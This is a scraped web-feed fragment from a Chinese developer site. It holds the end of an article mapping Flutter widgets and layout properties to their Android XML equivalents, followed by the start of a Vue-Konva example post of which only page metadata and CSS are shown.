<table><thead><tr><th>Flutter</th><th>Android XML</th><th>Flutter 常用属性</th><th>Android 常用属性</th></tr></thead><tbody><tr><td>Text</td><td>TextView</td><td>style, maxLines, overflow, textAlign</td><td>textSize(sp), textColor, maxLines, ellipsize, gravity</td></tr><tr><td>Image</td><td>ImageView</td><td>image(Asset/Network/File), fit(BoxFit), colorBlendMode</td><td>src, scaleType, tint</td></tr><tr><td>Icon</td><td>ImageView(Vector)</td><td>size, color</td><td>srcCompat(vector), tint</td></tr><tr><td>ElevatedButton</td><td>Button (Material)</td><td>onPressed, style(elevation, shape, backgroundColor)</td><td>onClick, backgroundTint, textAllCaps</td></tr><tr><td>OutlinedButton</td><td>Button + shape drawable</td><td>onPressed, side, shape</td><td>background, stroke, ripple</td></tr><tr><td>TextButton</td><td>Button(flat)</td><td>onPressed, style</td><td>textColor, ripple</td></tr><tr><td>Switch</td><td>SwitchCompat</td><td>value, onChanged, activeColor</td><td>checked, onCheckedChange, thumbTint</td></tr><tr><td>Checkbox</td><td>CheckBox</td><td>value, onChanged, tristate</td><td>checked, buttonTint</td></tr><tr><td>Radio</td><td>RadioButton</td><td>value, groupValue, onChanged</td><td>checked, buttonTint</td></tr><tr><td>Slider</td><td>SeekBar</td><td>value, min/max, divisions, label</td><td>progress, max</td></tr><tr><td>TextField / TextFormField</td><td>EditText (+ TextInputLayout)</td><td>controller, decoration(hint, prefix/suffix), keyboardType, obscureText</td><td>hint, inputType, maxLines, imeOptions</td></tr><tr><td>CircularProgressIndicator</td><td>ProgressBar (indeterminate)</td><td>strokeWidth, value</td><td>style="?android:attr/progressBarStyleLarge", indeterminate</td></tr><tr><td>LinearProgressIndicator</td><td>ProgressBar (horizontal)</td><td>minHeight, value</td><td>style="?android:attr/progressBarStyleHorizontal"</td></tr><tr><td>Card</td><td>CardView</td><td>elevation, margin, shape</td><td>cardUseCompatPadding, cardCornerRadius, cardElevation</td></tr><tr><td>Divider</td><td>View(height=1dp)</td><td>thickness, indent, color</td><td>layout_height, background</td></tr></tbody></table>
<h3 data-id="heading-3">属性对照与要点</h3>
<ul>
<li>
<p>宽高与权重</p>
<ul>
<li>Flutter: <code>SizedBox</code> / <code>Container(width/height)</code> 或 <code>constraints</code>；伸展用 <code>Expanded(flex)</code> / <code>Flexible(flex)</code>。</li>
<li>Android: <code>layout_width/height = wrap_content | match_parent</code>；伸展用 <code>layout_weight</code>（配合 <code>weightSum</code>）。</li>
</ul>
</li>
<li>
<p>对齐与重力</p>
<ul>
<li>Flutter: 行列用 <code>mainAxisAlignment</code> / <code>crossAxisAlignment</code>；单子项用 <code>Align(alignment)</code> / <code>Center</code>。</li>
<li>Android: 父容器对齐 <code>gravity</code>，子视图在父内的对齐 <code>layout_gravity</code>。</li>
</ul>
</li>
<li>
<p>间距</p>
<ul>
<li>Flutter: <code>padding</code> / <code>margin</code>（<code>Container(margin:)</code>）或 <code>SizedBox</code> 间隔；列表分隔用 <code>Divider</code> / <code>ListView.separated</code>。</li>
<li>Android: <code>padding</code> / <code>layout_margin</code>；<code>LinearLayout</code> 可用 <code>divider</code> / <code>showDividers</code>。</li>
</ul>
</li>
<li>
<p>叠放与定位</p>
<ul>
<li>Flutter: <code>Stack</code> + <code>Positioned(top/left/right/bottom)</code>；复杂约束可用 <code>LayoutBuilder</code> 等。</li>
<li>Android: <code>FrameLayout</code> 简单覆盖；<code>RelativeLayout/ConstraintLayout</code> 精细约束（如 ratio）。</li>
</ul>
</li>
<li>
<p>圆角、边框、阴影</p>
<ul>
<li>Flutter: <code>BoxDecoration(borderRadius, border, boxShadow)</code>；卡片阴影用 <code>Card</code> 或 <code>Material(elevation)</code>。</li>
<li>Android: shape drawable <code>&lt;shape&gt;&lt;corners/&gt;&lt;stroke/&gt;&lt;/shape&gt;</code>；<code>elevation</code> / <code>cardElevation</code>。</li>
</ul>
</li>
<li>
<p>图片填充</p>
<ul>
<li>Flutter: <code>fit: BoxFit.cover / contain / fill</code>。</li>
<li>Android: <code>scaleType="centerCrop / fitCenter / fitXY"</code>。</li>
</ul>
</li>
<li>
<p>滚动与复用</p>
<ul>
<li>Flutter: <code>ListView.builder</code> / <code>GridView.builder</code> 按需构建。</li>
<li>Android: <code>RecyclerView</code> + <code>Adapter/ViewHolder</code> 复用。</li>
</ul>
</li>
<li>
<p>可见性</p>
<ul>
<li>Flutter: <code>Visibility</code>（gone/invisible）、<code>Offstage</code>（不布局）。</li>
<li>Android: <code>visibility="visible|invisible|gone"</code>。</li>
</ul>
</li>
<li>
<p>点击反馈（波纹）</p>
<ul>
<li>Flutter: <code>InkWell</code> / <code>InkResponse</code>（需有 <code>Material</code> 祖先）。</li>
<li>Android: <code>foreground="?attr/selectableItemBackgroundBorderless"</code> 或 <code>ripple</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">详细属性对照与解释</h3>
<h4 data-id="heading-5">1) 尺寸与约束（Size &amp; Constraints）</h4>









































<table><thead><tr><th>目的</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>固定宽高</td><td><code>SizedBox(width, height)</code> / <code>Container(width, height)</code></td><td><code>layout_width/height</code> = 定值dp</td><td>Flutter 中宽高为逻辑像素，Android 常用 dp；注意统一度量。</td></tr><tr><td>自适应内容</td><td>默认（未设置尺寸）</td><td><code>wrap_content</code></td><td>子内容决定大小。</td></tr><tr><td>占满父容器</td><td><code>SizedBox.expand()</code> / <code>Align(alignment).widthFactor/heightFactor</code></td><td><code>match_parent</code></td><td>Flutter 多通过父布局约束，或 <code>Expanded</code> 占满主轴剩余空间。</td></tr><tr><td>最小/最大约束</td><td><code>ConstrainedBox/BoxConstraints</code></td><td>需使用 ConstraintLayout 或在代码中测量</td><td>Flutter 提供更直接的最小/最大边界控制。</td></tr><tr><td>比例</td><td><code>AspectRatio(aspectRatio)</code></td><td><code>app:layout_constraintDimensionRatio="W:H"</code></td><td>Android 需用 ConstraintLayout 的 ratio。</td></tr></tbody></table>
<h4 data-id="heading-6">2) Flex/权重（Row/Column ↔ LinearLayout weight）</h4>



































<table><thead><tr><th>概念</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>主轴方向</td><td>Row(横) / Column(竖)</td><td>LinearLayout orientation</td><td>一致。</td></tr><tr><td>权重</td><td><code>Expanded(flex: n)</code> / <code>Flexible(flex: n)</code></td><td><code>layout_weight="n"</code>（配合 <code>weightSum</code> 可选）</td><td>多个子视图按权重分配主轴剩余空间。</td></tr><tr><td>主轴对齐</td><td><code>mainAxisAlignment</code> = start/end/center/spaceBetween/spaceAround/spaceEvenly</td><td><code>gravity</code>（对父），也可靠权重实现分布</td><td>Flutter 内置更丰富的分布方式。</td></tr><tr><td>交叉轴对齐</td><td><code>crossAxisAlignment</code> = start/end/center/stretch/baseline</td><td><code>gravity</code>（对子）+ <code>layout_gravity</code></td><td>Flutter 的 <code>stretch</code> 等价于 Android 子视图 <code>match_parent</code> 结合父 gravity。</td></tr></tbody></table>
<p>常见映射：</p>
<ul>
<li><code>mainAxisAlignment.spaceBetween</code> ≈ 子项均匀分布，首尾贴边；Android 需用 <code>weight</code> 或约束实现。</li>
<li><code>crossAxisAlignment.stretch</code> ≈ 子项交叉轴拉伸；Android 子项 <code>match_parent</code>。</li>
</ul>
<h4 data-id="heading-7">3) 对齐（Alignment ↔ gravity/layout_gravity）</h4>



















































<table><thead><tr><th>Flutter Alignment</th><th>Android</th><th>说明</th></tr></thead><tbody><tr><td><code>Alignment.center</code></td><td><code>gravity="center"</code> 或子 <code>layout_gravity="center"</code></td><td>居中</td></tr><tr><td><code>Alignment.topLeft</code></td><td>`gravity="top</td><td>start"`</td><td>左上</td></tr><tr><td><code>Alignment.topRight</code></td><td>`gravity="top</td><td>end"`</td><td>右上</td></tr><tr><td><code>Alignment.bottomLeft</code></td><td>`gravity="bottom</td><td>start"`</td><td>左下</td></tr><tr><td><code>Alignment.bottomRight</code></td><td>`gravity="bottom</td><td>end"`</td><td>右下</td></tr><tr><td><code>Alignment.centerLeft</code></td><td>`gravity="center_vertical</td><td>start"`</td><td>垂直居中靠左</td></tr><tr><td><code>Alignment.centerRight</code></td><td>`gravity="center_vertical</td><td>end"`</td><td>垂直居中靠右</td></tr></tbody></table>
<p>父容器整体对齐用 <code>gravity</code>，单个子视图在父内对齐用 <code>layout_gravity</code>。</p>
<h4 data-id="heading-8">4) 间距（Padding &amp; Margin）</h4>

























<table><thead><tr><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td><code>Padding(padding: EdgeInsets.all(8))</code></td><td><code>padding="8dp"</code></td><td>全部边同值</td></tr><tr><td><code>EdgeInsets.symmetric(horizontal: 8, vertical: 4)</code></td><td><code>paddingStart/End/Top/Bottom</code></td><td>水平/垂直对称</td></tr><tr><td><code>Container(margin: ...)</code></td><td><code>layout_margin*</code></td><td>外边距在 Android 用 <code>layout_margin</code> 系列属性</td></tr></tbody></table>
<p>建议：统一使用 Android 的 dp 与 Flutter 的逻辑像素换算（一般 1:1 视觉等效）。</p>
<h4 data-id="heading-9">5) 文本（Text ↔ TextView）</h4>



































































<table><thead><tr><th>需求</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>字号</td><td><code>style: TextStyle(fontSize: 16)</code></td><td><code>textSize="16sp"</code></td><td>Android 使用 sp，Flutter 逻辑像素接近 sp 语义</td></tr><tr><td>颜色</td><td><code>TextStyle(color: Colors.red)</code></td><td><code>textColor</code></td><td/></tr><tr><td>字重</td><td><code>fontWeight: FontWeight.w600</code></td><td><code>textStyle="bold"</code> 或 <code>setTypeface</code></td><td>Android XML 原生支持有限</td></tr><tr><td>行高</td><td><code>height: 1.4</code></td><td><code>lineSpacingMultiplier="1.4"</code></td><td>Flutter 行高为倍数（相对 fontSize）</td></tr><tr><td>字间距</td><td><code>letterSpacing: 0.5</code></td><td><code>android:letterSpacing="0.05"</code></td><td>Android 为 em 单位（0.05≈5%）</td></tr><tr><td>装饰</td><td><code>decoration: TextDecoration.underline</code></td><td><code>paintFlags="underline"</code></td><td/></tr><tr><td>对齐</td><td><code>textAlign: center/left/right/justify</code></td><td>`gravity="center</td><td>start</td><td>end"`</td><td/></tr><tr><td>溢出省略</td><td><code>overflow: TextOverflow.ellipsis, maxLines: n</code></td><td><code>ellipsize="end", maxLines="n"</code></td><td>两端省略/中间省略需要自定义</td></tr><tr><td>自动换行</td><td><code>softWrap: true</code></td><td>默认换行</td><td/></tr></tbody></table>
<h4 data-id="heading-10">6) 图片填充（BoxFit ↔ scaleType）</h4>



































<table><thead><tr><th>Flutter <code>BoxFit</code></th><th>Android <code>scaleType</code></th><th>行为</th></tr></thead><tbody><tr><td><code>contain</code></td><td><code>fitCenter</code></td><td>等比完整显示，可能留白</td></tr><tr><td><code>cover</code></td><td><code>centerCrop</code></td><td>等比裁剪铺满，可能截断</td></tr><tr><td><code>fill</code></td><td><code>fitXY</code></td><td>拉伸铺满，可能变形</td></tr><tr><td><code>fitWidth</code></td><td><code>fitStart/fitEnd</code> + 尺寸控制</td><td>宽度充满，等比缩放</td></tr><tr><td><code>none</code></td><td><code>center</code></td><td>原始大小置中</td></tr></tbody></table>
<h4 data-id="heading-11">7) 背景、圆角、边框、阴影</h4>



































<table><thead><tr><th>效果</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>背景色</td><td><code>Container(color)</code> 或 <code>decoration.color</code></td><td><code>background</code></td><td>Flutter 建议使用 <code>decoration</code></td></tr><tr><td>圆角</td><td><code>borderRadius: BorderRadius.circular(8)</code></td><td><code>&lt;shape&gt;&lt;corners android:radius="8dp"/&gt;&lt;/shape&gt;</code></td><td>Android 采用 shape drawable</td></tr><tr><td>边框</td><td><code>border: Border.all(color, width)</code></td><td><code>&lt;stroke android:width="1dp" android:color="..."/&gt;</code></td><td/></tr><tr><td>阴影</td><td><code>boxShadow</code> / <code>Material(elevation)</code></td><td><code>elevation</code> / <code>cardElevation</code></td><td>Flutter 的 <code>elevation</code> 需 Material 语义</td></tr></tbody></table>
<h4 data-id="heading-12">8) 可见性与占位</h4>























<table><thead><tr><th>场景</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>占位但不可见</td><td><code>Visibility(visible: false, maintainSize: true)</code></td><td><code>visibility="invisible"</code></td><td>仍占据空间</td></tr><tr><td>不占位隐藏</td><td><code>Visibility(visible: false)</code> / <code>Offstage(offstage: true)</code></td><td><code>visibility="gone"</code></td><td>不参与布局</td></tr></tbody></table>
<h4 data-id="heading-13">9) 交互与手势</h4>





























<table><thead><tr><th>功能</th><th>Flutter</th><th>Android</th><th>说明</th></tr></thead><tbody><tr><td>点击</td><td><code>GestureDetector(onTap)</code> / <code>InkWell</code></td><td><code>android:onClick</code> 或 <code>setOnClickListener</code></td><td>Flutter 的 <code>InkWell</code> 有水波纹反馈</td></tr><tr><td>长按</td><td><code>onLongPress</code></td><td><code>setOnLongClickListener</code></td><td/></tr><tr><td>滑动</td><td><code>onPan*</code> / <code>onHorizontalDrag*</code></td><td><code>OnTouchListener</code> + GestureDetector</td><td>复杂手势 Flutter 更便捷</td></tr></tbody></table>
<h4 data-id="heading-14">10) 滚动与惯性</h4>























<table><thead><tr><th>需求</th><th>Flutter</th><th>Android</th><th>说明</th></tr></thead><tbody><tr><td>惯性/物理</td><td><code>physics: BouncingScrollPhysics / ClampingScrollPhysics</code></td><td><code>OverScrollMode</code>, <code>EdgeEffect</code></td><td>iOS 风格回弹用 <code>Bouncing</code></td></tr><tr><td>嵌套滚动</td><td><code>NestedScrollView</code>/Slivers</td><td><code>NestedScrollView</code></td><td>都支持 AppBar 联动等高级效果</td></tr></tbody></table>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue-Konva 使用（缩放 / 还原 / 拖动） 示例]]></title>    <link>https://juejin.cn/post/7575757258833379354</link>    <guid>https://juejin.cn/post/7575757258833379354</guid>    <pubDate>2025-11-24T03:55:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833379354" data-draft-id="7575748159608586266" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue-Konva 使用（缩放 / 还原 / 拖动） 示例"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-11-24T03:55:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端卿年"/> <meta itemprop="url" content="https://juejin.cn/user/2277843825591400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue-Konva 使用（缩放 / 还原 / 拖动） 示例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843825591400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端卿年
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:55:49.000Z" title="Mon Nov 24 2025 03:55:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body 